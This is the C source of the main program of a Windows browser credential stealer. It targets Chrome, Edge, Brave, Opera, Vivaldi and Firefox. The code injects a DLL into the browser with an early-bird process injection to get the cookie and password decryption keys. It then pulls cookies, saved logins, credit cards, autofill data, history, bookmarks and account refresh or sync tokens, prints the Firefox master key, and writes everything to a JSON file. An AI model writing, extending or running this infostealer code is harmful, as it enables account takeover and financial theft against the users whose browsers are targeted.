#include "Headers.h"


static VOID PrintUsage(IN LPCSTR pszExeName)
{
    printf("Usage: %s [options]\n\n", pszExeName);
    printf("Options:\n");
    printf("  /b:<browser> Target Browser: chrome, edge, brave, opera, operagx, vivaldi, firefox, all\n");
    printf("               (default: system default browser)\n");
    printf("  /o <file>    Output JSON File (default: <browser>Data.json)\n");
    printf("  /all         Export All Entries (default: max %d per category)\n", MAX_DISPLAY_COUNT);
    printf("  /?           Show This Help Message\n\n");
    printf("Examples:\n");
    printf("  %s                            Extract %d Entries From The Default Browser\n", pszExeName, MAX_DISPLAY_COUNT);
    printf("  %s /b:chrome                  Extract %d Entries From Chrome\n", pszExeName, MAX_DISPLAY_COUNT);
    printf("  %s /b:firefox /all            Export All Entries From Firefox\n", pszExeName);
    printf("  %s /b:brave /o Output.json    Extract %d Entries From Brave To Output.json\n", pszExeName, MAX_DISPLAY_COUNT);
    printf("  %s /b:all /all                Extract All From All Installed Browsers\n\n", pszExeName);
}

static BROWSER_TYPE ParseBrowserArg(IN LPCSTR pszArg, OUT PBOOL pbAllBrowsers)
{
    // Skip the "/b:" or "-b:" prefix
    LPCSTR pszBrowser = pszArg + 3;

    *pbAllBrowsers = FALSE;

    if (pszBrowser[0] == '\0') return BROWSER_UNKNOWN;

    if (lstrcmpiA(pszBrowser, "all") == 0)
    {
        *pbAllBrowsers = TRUE;
        return BROWSER_CHROME;
    }
    else if (StrStrIA(pszBrowser, STR_CHROME_BRSR_NAME))
        return BROWSER_CHROME;
    else if (StrStrIA(pszBrowser, STR_BRAVE_BRSR_NAME))
        return BROWSER_BRAVE;
    else if (StrStrIA(pszBrowser, STR_EDGE_BRSR_NAME) || StrStrIA(pszBrowser, STR_EDGE_ALT_BRSR_NAME))
        return BROWSER_EDGE;
    else if (StrStrIA(pszBrowser, STR_OPERA_GX_BRSR_NAME) || StrStrIA(pszBrowser, STR_OPERA_ALT_GX_BRSR_NAME))
        return BROWSER_OPERA_GX;
    else if (StrStrIA(pszBrowser, STR_OPERA_BRSR_NAME))
        return BROWSER_OPERA;
    else if (StrStrIA(pszBrowser, STR_VIVALDI_BRSR_NAME))
        return BROWSER_VIVALDI;
    else if (StrStrIA(pszBrowser, STR_FIREFOX_BRSR_NAME))
        return BROWSER_FIREFOX;

    return BROWSER_UNKNOWN;
}


static BOOL IsBrowserInstalled(IN BROWSER_TYPE Browser)
{
    WCHAR szBrowserPath[MAX_PATH] = { 0 };
    return GetBrowserPath(Browser, szBrowserPath, MAX_PATH);
}


static BOOL GetDefaultBrowser(OUT BROWSER_TYPE* pBrowser, OUT OPTIONAL LPWSTR szBrowserPath, IN OPTIONAL DWORD dwBrowserPathSize)
{
    WCHAR   szProgId[MAX_PATH]  = { 0 };
    DWORD   dwPathLen           = dwBrowserPathSize,
            dwProgIdLen         = _countof(szProgId);
    HRESULT hResult             = S_OK;

    if (!pBrowser) return FALSE;

    if (szBrowserPath && dwBrowserPathSize)
    {
        if (FAILED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, L"http", L"open", szBrowserPath, &dwPathLen))))
        {
            printf("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X\n", __LINE__, hResult);
            return FALSE;
        }

        if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
        {
            printf("[!] GetFileAttributesW Failed For '%ws' With Error: %lu\n", szBrowserPath, GetLastError());
            return FALSE;
        }
    }

    *pBrowser = BROWSER_UNKNOWN;

    if (SUCCEEDED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_PROGID, L"http", L"open", szProgId, &dwProgIdLen))))
    {
        if (StrCmpIW(szProgId, STR_CHROME_PROGID) == 0)
            *pBrowser = BROWSER_CHROME;
        else if (StrCmpIW(szProgId, STR_BRAVE_PROGID) == 0)
            *pBrowser = BROWSER_BRAVE;
        else if (StrCmpIW(szProgId, STR_EDGE_PROGID) == 0)
            *pBrowser = BROWSER_EDGE;
        else if (StrCmpIW(szProgId, STR_OPERA_PROGID) == 0)
            *pBrowser = BROWSER_OPERA;
        else if (StrCmpIW(szProgId, STR_OPERA_GX_PROGID) == 0)
            *pBrowser = BROWSER_OPERA_GX;
        else if (StrCmpIW(szProgId, STR_VIVALDI_PROGID) == 0)
            *pBrowser = BROWSER_VIVALDI;
        else if (StrCmpIW(szProgId, STR_FIREFOX_PROGID) == 0)
            *pBrowser = BROWSER_FIREFOX;
    }
    else
    {
        printf("[!] AssocQueryStringW [%d] Failed With Error: 0x%08X\n", __LINE__, hResult);
        return FALSE;
    }

    return TRUE;
}

static BOOL CacheBrowserDataFiles(IN BROWSER_TYPE Browser)
{
#define BROWSER_DATA_FILE_TYPE_COUNT 6

    CHAR    szRelPaths[BROWSER_DATA_FILE_TYPE_COUNT][MAX_PATH]  = { 0 };
    LPCSTR  ppszRelPaths[BROWSER_DATA_FILE_TYPE_COUNT]          = { 0 };
    DWORD   dwFileCount                                         = 0x00;

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_COOKIES, szRelPaths[0], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[0];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOGIN_DATA, szRelPaths[1], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[1];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPaths[2], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[2];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_HISTORY, szRelPaths[3], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[3];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_BOOKMARKS, szRelPaths[4], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[4];

    if (GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPaths[5], MAX_PATH))
        ppszRelPaths[dwFileCount++] = szRelPaths[5];

    if (dwFileCount == 0)
        return FALSE;

    // printf("[i] Caching %lu Browser Data Files...\n", dwFileCount);

    return (GetBrowserDataFilePathEx(Browser, ppszRelPaths, dwFileCount) > 0);

#undef BROWSER_DATA_FILE_TYPE_COUNT
}

static BOOL ExtractFromBrowser(IN BROWSER_TYPE Browser, IN LPCSTR pszOutputFile, IN BOOL bShowAll)
{
    CHROMIUM_DATA   ChromiumData    = { 0 };
    BOOL            bResult         = FALSE;

    printf("[*] Target Browser: %s\n", GetBrowserName(Browser));

    // Initialize the data structure
    if (!InitializeChromiumData(&ChromiumData))
    {
        printf("[!] Failed To Initialize Chromium Data\n");
        goto _END_OF_FUNC;
    }
    
    if (Browser != BROWSER_FIREFOX)
    {
        // Pre-cache All Browser Data Files 
        // Pre-caching only Works For Chromium Browsers. 
        // Because The `GetXXXPathForBrowser` Getters Dont Handle FireFox Paths
        CacheBrowserDataFiles(Browser);

        // Inject DLL to get decryption keys only
        if (!InjectDllViaEarlyBird(Browser, &ChromiumData))
        {
            printf("[!] Failed To Retrieve Decryption Keys\n");
            goto _END_OF_FUNC;
        }

        printf("[+] Retrieved Decryption Keys (V10: %s, V20: %s)\n", ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");

        printf("[*] Extracting Browser Data...\n");

        ExtractCookiesFromDatabase(Browser, &ChromiumData);
        ExtractLoginsFromDatabase(Browser, &ChromiumData);
        ExtractCreditCardsFromDatabase(Browser, &ChromiumData);
        ExtractAutofillFromDatabase(Browser, &ChromiumData);
        ExtractHistoryFromDatabase(Browser, &ChromiumData);
        ExtractBookmarksFromFile(Browser, &ChromiumData);
    
        if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
            ExtractOperaAccessTokensFromDatabase(Browser, &ChromiumData);
        else
            ExtractRefreshTokenFromDatabase(Browser, &ChromiumData);
    }
    else
    {
        printf("[*] Extracting Browser Data...\n");

        ExtractFirefoxCookies(&ChromiumData);
        ExtractFirefoxHistory(&ChromiumData);
        ExtractFirefoxBookmarks(&ChromiumData);
        ExtractFirefoxAutofill(&ChromiumData);

        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA))))
        {
            printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }

        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen))
        {
            LPSTR pszMasterKeyHex = BytesToHexString(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen);
            if (pszMasterKeyHex)
            {
                printf("[+] Firefox Master Key: %s\n", pszMasterKeyHex);
                HEAP_FREE(pszMasterKeyHex);
            }

            ExtractFirefoxLogins(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen, &ChromiumData);
        }

        ExtractFirefoxAccountTokens(ChromiumData.pFireFoxBrsrData);
    }

#define PRINT_COUNT(label, count) \
    bShowAll ? printf("[i] " label "%lu\n", count) : printf("[i] " label "%lu/%lu\n", min(count, MAX_DISPLAY_COUNT), count)

    printf("[+] Extraction Complete!\n");
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Tokens:         ", ChromiumData.dwTokenCount);
    } 
    else
    {
        if (ChromiumData.pFireFoxBrsrData)
        {
            printf("[i] Account Email:  %s\n", ChromiumData.pFireFoxBrsrData->szEmail ? ChromiumData.pFireFoxBrsrData->szEmail : "N/A");
            printf("[i] Session Token:  %s\n", ChromiumData.pFireFoxBrsrData->szSessionToken ? "Found" : "N/A");
            printf("[i] Sync Token:     %s\n", ChromiumData.pFireFoxBrsrData->szSyncOAuthToken ? "Found" : "N/A");
        }
    }
    if (Browser != BROWSER_FIREFOX)
    {
        PRINT_COUNT("Credit Cards:   ", ChromiumData.dwCreditCardCount);
    }
    PRINT_COUNT("Cookies:        ", ChromiumData.dwCookieCount);
    PRINT_COUNT("Logins:         ", ChromiumData.dwLoginCount);
    PRINT_COUNT("Autofill:       ", ChromiumData.dwAutofillCount);
    PRINT_COUNT("History:        ", ChromiumData.dwHistoryCount);
    PRINT_COUNT("Bookmarks:      ", ChromiumData.dwBookmarkCount);

#undef PRINT_COUNT

    if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, bShowAll))
    {
        printf("[!] Failed To Write The %s JSON File\n", pszOutputFile);
        goto _END_OF_FUNC;
    }

    printf("[+] Extracted Data Is Written To: %s\n", pszOutputFile);
    printf("\n");

    bResult = TRUE;

_END_OF_FUNC:
    FreeChromiumData(&ChromiumData);
    DeleteDataFilesCache();
    return bResult;
}


int main(int argc, char* argv[])
{
    BOOL            bShowAll            = FALSE;
    BOOL            bAllBrowsers        = FALSE;
    LPCSTR          pszOutputFile       = NULL;
    BROWSER_TYPE    BrowserType         = BROWSER_UNKNOWN;
    DWORD           dwSuccessCount      = 0,
                    dwFailCount         = 0,
                    dwSkipCount         = 0;
    INT             nResult             = -1;

    for (int i = 1; i < argc; i++)
    {
        if (lstrcmpiA(argv[i], "/?") == 0 || lstrcmpiA(argv[i], "-?") == 0 || lstrcmpiA(argv[i], "/h") == 0 || lstrcmpiA(argv[i], "-h") == 0)
        {
            PrintUsage(PathFindFileNameA(argv[0]));
            return 0;
        }
        else if (StrStrIA(argv[i], "/b:") == argv[i] || StrStrIA(argv[i], "-b:") == argv[i])
        {
            BrowserType = ParseBrowserArg(argv[i], &bAllBrowsers);
            if (BrowserType == BROWSER_UNKNOWN)
            {
                printf("[!] Unknown Browser: '%s'\n", argv[i] + 3);
                PrintUsage(PathFindFileNameA(argv[0]));
                return -1;
            }
        }
        else if (lstrcmpiA(argv[i], "/all") == 0 || lstrcmpiA(argv[i], "-all") == 0)
        {
            bShowAll = TRUE;
        }
        else if (lstrcmpiA(argv[i], "/o") == 0 || lstrcmpiA(argv[i], "-o") == 0)
        {
            if (i + 1 < argc)
            {
                pszOutputFile = argv[++i];
            }
            else
            {
                printf("[!] Error: '/o' Requires A Filename\n\n");
                PrintUsage(PathFindFileNameA(argv[0]));
                return -1;
            }
        }
        else
        {
            printf("[!] Unknown Argument: '%s'\n\n", argv[i]);
            PrintUsage(PathFindFileNameA(argv[0]));
            return -1;
        }
    }

    // If no browser specified, detect default browser
    if (BrowserType == BROWSER_UNKNOWN && !bAllBrowsers)
    {
        if (!GetDefaultBrowser(&BrowserType, NULL, 0) || BrowserType == BROWSER_UNKNOWN)
        {
            printf("[!] Failed To Detect Default Browser\n");
            printf("[i] Please Specify A Browser With /b:<browser>\n\n");
            PrintUsage(PathFindFileNameA(argv[0]));
            return -1;
        }

        printf("[i] No Arguments Provided, Targeting The Default Browser\n");
    }

    if (bAllBrowsers)
    {
        if (pszOutputFile) printf("[!] Warning: '/o' Is Ignored When Using '/b:all'\n");

        BROWSER_TYPE Browsers[] = { BROWSER_CHROME, BROWSER_EDGE, BROWSER_BRAVE, BROWSER_OPERA, BROWSER_OPERA_GX, BROWSER_FIREFOX, BROWSER_VIVALDI };

        for (DWORD i = 0; i < _countof(Browsers); i++)
        {
            if (!IsBrowserInstalled(Browsers[i]))
            {
                printf("[i] %s: Not Installed, Skipping...\n\n", GetBrowserName(Browsers[i]));
                dwSkipCount++;
                continue;
            }

            if (ExtractFromBrowser(Browsers[i], GetBrowserOutputFile(Browsers[i]), bShowAll))
                dwSuccessCount++;
            else
                dwFailCount++;
        }

        printf("\n");
        printf("[#] Summary: %lu Succeeded, %lu Failed, %lu Skipped\n", dwSuccessCount, dwFailCount, dwSkipCount);

        nResult = (dwSuccessCount > 0) ? 0 : -1;
    }
    else
    {
        if (!pszOutputFile)
            pszOutputFile = GetBrowserOutputFile(BrowserType);

        if (ExtractFromBrowser(BrowserType, pszOutputFile, bShowAll))
            nResult = 0;
    }

    printf("[*] Bye!\n");

    return nResult;
}
